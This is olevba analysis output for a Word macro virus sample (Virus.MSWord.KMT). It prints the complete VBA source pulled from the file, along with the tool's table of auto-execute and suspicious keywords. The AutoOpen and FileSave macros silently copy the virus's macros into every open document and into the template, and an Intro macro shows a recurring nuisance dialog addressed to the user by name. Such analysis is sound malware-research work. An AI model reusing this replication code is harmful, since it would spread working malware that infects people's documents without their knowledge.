olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.KMT-43dc7150d24fae117d37c34dd59402becedb940b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.KMT-43dc7150d24fae117d37c34dd59402becedb940b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: Virus.MSWord.KMT-43dc7150d24fae117d37c34dd59402becedb940b - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Runs, creates, deletes, or revises a macro"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.KMT-43dc7150d24fae117d37c34dd59402becedb940b - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
    On Error GoTo -1: On Error GoTo Quit:
    WordBasic.Call "AutoOpen"
    WordBasic.FileSave
Quit:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.KMT-43dc7150d24fae117d37c34dd59402becedb940b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim tmp$
Dim UsersName$

Public Sub MAIN()
Dim source$
Dim numwin
Dim cWind
Dim i
Dim leave
Dim Dest$
Dim kmt$
tmp$ = ""
UsersName$ = ""
  On Error Resume Next
  WordBasic.DisableInput 1
  GetUsersName
  If UsersName$ = "KMT" Then GoTo Lquit:
  source$ = UCase(WordBasic.[MacroFileName$]())
  numwin = WordBasic.CountWindows()
  cWind = WordBasic.Window()
  WordBasic.ScreenUpdating 0
  If numwin <> 0 Then
    i = 1
    While i <= numwin And leave <> 1
        WordBasic.WindowList i
        Dest$ = UCase(GetFileName$)
        i = i + 1
        If (Dest$ <> "") Then
            If WordBasic.[Right$](Dest$, 4) <> ".DOC" Then
                Dest$ = Dest$ + ".DOC"
            End If
            kmt$ = WordBasic.[GetDocumentVar$]("KMT_HYDER(0)")
            'If (kmt$ <> "KMT_HYDER") Then
                WordBasic.SetDocumentVar "KMT_HYDER(0)", "KMT_HYDER"
                On Error Resume Next
                WordBasic.FileSaveAs Name:=Dest$, Format:=1, AddToMru:=0
                Infect source$, Dest$
                Infect source$, tmp$
            'End If
        End If
    Wend
  End If
  WordBasic.WindowList cWind
Lquit:
  WordBasic.ScreenUpdating 0
End Sub

Private Function GetFileName$()
Dim n$
    On Error GoTo -1: On Error GoTo QuitHere:
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.DocumentStatistics(False)
    WordBasic.CurValues.DocumentStatistics dlg
    tmp$ = dlg.Template
    If dlg.Directory <> "" Then
    n$ = dlg.Directory + "\" + dlg.FileName
    End If
QuitHere:
    GetFileName$ = n$
End Function

Private Sub Infect(source$, Dest$)
Dim num
Dim i
    ReDim name___$(5)
    name___$(0) = "AutoExec"
    name___$(1) = "AutoOpen"
    name___$(2) = "Intro"
    name___$(3) = "ToolsMacro"
    name___$(4) = "FileSave"
    num = 4
    On Error Resume Next
    If source$ <> Dest$ Then
      For i = 0 To num
        WordBasic.Organizer Copy:=1, source:=source$, Destination:=Dest$, _
              Name:=name___$(i), Tab:=3
      Next
    End If
End Sub

Private Sub GetUsersName()
    On Error Goto -1 : On Error Goto err.Number :
    WordBasic.DisableInput 1
    Dim TOUdlg As Object: Set TOUdlg = WordBasic.DialogRecord.ToolsOptionsUserInfo(False)
    WordBasic.CurValues.ToolsOptionsUserInfo TOUdlg
    UsersName$ = TOUdlg.Initials
    GoTo pass:
Err.Number:
UsersName$ = "Hello there!"
pass:
End Sub

-------------------------------------------------------------------------------
VBA MACRO Intro.bas 
in file: Virus.MSWord.KMT-43dc7150d24fae117d37c34dd59402becedb940b - OLE stream: 'Macros/VBA/Intro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim UsersName$
Public Sub MAIN()
Dim n
UsersName$ = ""
WordBasic.BeginDialog 472, 204, "KMT Message ", "Intro.func"
    WordBasic.GroupBox 10, 1, 452, 199, ""
    WordBasic.Picture 20, 16, 432, 182, "ClipboardPicture", 3, "Title"
    WordBasic.Picture 295, 16, 25, 25, "ClipboardPicture", 3, "Picture6"
    WordBasic.Picture 107, 16, 25, 25, "ClipboardPicture", 3, "Picture2"
    WordBasic.Picture 54, 16, 25, 20, "ClipboardPicture", 3, "Picture1"
    WordBasic.Picture 205, 16, 25, 25, "ClipboardPicture", 3, "Picture4"
    WordBasic.Picture 155, 16, 25, 25, "ClipboardPicture", 3, "Picture3"
    WordBasic.Picture 342, 16, 25, 25, "ClipboardPicture", 3, "Picture7"
    WordBasic.Picture 249, 16, 25, 25, "ClipboardPicture", 3, "Picture5"
    WordBasic.Picture 390, 16, 25, 25, "ClipboardPicture", 3, "Picture8"
    WordBasic.OKButton 230, 73, 88, 21, "pbOK"
WordBasic.EndDialog
GetUsersName1
If UsersName$ = "KMT" Then GoTo Quit:
GetUsersName
Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
n = WordBasic.Dialog.UserDialog(dlg, -2, 5000)
Quit:
End Sub

Private Function func(id$, item, sv)
    WordBasic.DisableInput 1
    WordBasic.DlgVisible "pbOK", 0
    Select Case item
       Case 1: GetTitleScreen
       Case 5: F2
       Case Else
    End Select
End Function

Private Sub GetTitleScreen()
Dim n$
Dim h$
Dim m$
Dim ti1$
Dim h_
Dim m_
Dim ti$
    On Error Resume Next
    WordBasic.DisableInput 1
    n$ = Str(WordBasic.Now())
    h$ = Str(WordBasic.Hour(WordBasic.Now()))
    m$ = Str(WordBasic.Minute(WordBasic.Now()))
    ti1$ = h$ + ":" + m$
    n$ = Str(WordBasic.Now())
    h_ = WordBasic.Hour(WordBasic.Now())
    m_ = WordBasic.Minute(WordBasic.Now()) + 30
    If m_ > 59 Then
        m_ = m_ - 59
        h_ = h_ + 1
        If h_ > 23 Then h_ = h_ - 23
    End If
    h$ = Str(h_)
    m$ = Str(m_)
    ti$ = h$ + ":" + m$
    WordBasic.OnTime ti$, "Intro"
    WordBasic.WaitCursor 1
    WordBasic.ScreenUpdating 0
    WordBasic.FileNew
    WordBasic.FormatFont Points:="40", Font:="Desdemona", Underline:=0, _
               Bold:=1, Color:=2
    WordBasic.FormatParagraph After:="18 pt"
    WordBasic.Insert UsersName$
    'FormatBordersAndShading .BottomBorder = 6,  .BottomColor = 9
    WordBasic.FormatFont Points:="36", Font:="Arial", Underline:=0, _
               Bold:=1, Color:=13
    WordBasic.InsertPara: WordBasic.ResetPara
    WordBasic.Insert "Now it's " + ti1$ + "."
    WordBasic.InsertPara: WordBasic.ResetPara
    WordBasic.Insert "I think works is enought"
    WordBasic.InsertPara: WordBasic.ResetPara
    WordBasic.Insert "You should back home!"
    WordBasic.EditSelectAll: WordBasic.CenterPara
    WordBasic.EditCopy
    WordBasic.DlgSetPicture "Title", "", 3
    WordBasic.FileClose 2
    WordBasic.ScreenUpdating -1
    WordBasic.WaitCursor 0
End Sub

Private Sub F2()
Dim i
  WordBasic.DisableInput 1
  For i = 1 To 8
       GetButtonImage2 "Picture" + WordBasic.[Right$](Str(i), 1), "Standard", i
       delay (200)
  Next
End Sub

Private Sub delay(time_)
Dim ex
    WordBasic.DisableInput 1
    ex = 0
    While ex < time_
        ex = ex + 1
    Wend
End Sub

Private Sub GetButtonImage2(id$, Tb$, x)
    On Error Resume Next
    WordBasic.CopyButtonImage Tb$, x
    WordBasic.DlgSetPicture id$, "", 3
End Sub

Private Sub GetUsersName()
    On Error Goto -1 : On Error Goto err.Number :
    WordBasic.DisableInput 1
    Dim TOUdlg As Object: Set TOUdlg = WordBasic.DialogRecord.ToolsOptionsUserInfo(False)
    WordBasic.CurValues.ToolsOptionsUserInfo TOUdlg
    UsersName$ = "Hey! " + TOUdlg.Name
    GoTo pass:
Err.Number:
UsersName$ = "Hello there!"
pass:
End Sub

Private Sub GetUsersName1()
    On Error Goto -1 : On Error Goto err.Number :
    WordBasic.DisableInput 1
    Dim TOUdlg As Object: Set TOUdlg = WordBasic.DialogRecord.ToolsOptionsUserInfo(False)
    WordBasic.CurValues.ToolsOptionsUserInfo TOUdlg
    UsersName$ = TOUdlg.Initials
    GoTo pass:
Err.Number:
UsersName$ = "Hello there!"
pass:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

